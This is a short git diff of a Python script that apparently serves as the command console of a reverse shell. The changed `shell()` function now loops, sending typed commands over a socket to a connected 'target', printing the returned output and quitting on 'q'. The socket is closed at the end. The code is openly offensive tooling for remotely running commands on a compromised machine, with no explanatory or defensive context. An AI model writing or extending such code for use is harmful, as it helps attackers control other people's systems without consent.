@@ -4,10 +4,14 @@ import socket
 
 
 def shell():
-    command = raw_input("Shell#~%s: "%str(ip))
-    target.send(command)
-    message = target.recv(1024)
-    print(message)
+    while True:
+        command = raw_input("Shell#~%s: "%str(ip))
+        target.send(command)
+        if command == 'q':
+            break
+        else:
+            result = target.recv(1024)
+            print(result)
 
 def server():
     global s
@@ -24,3 +28,4 @@ def server():
 
 server()
 shell()
+s.close()
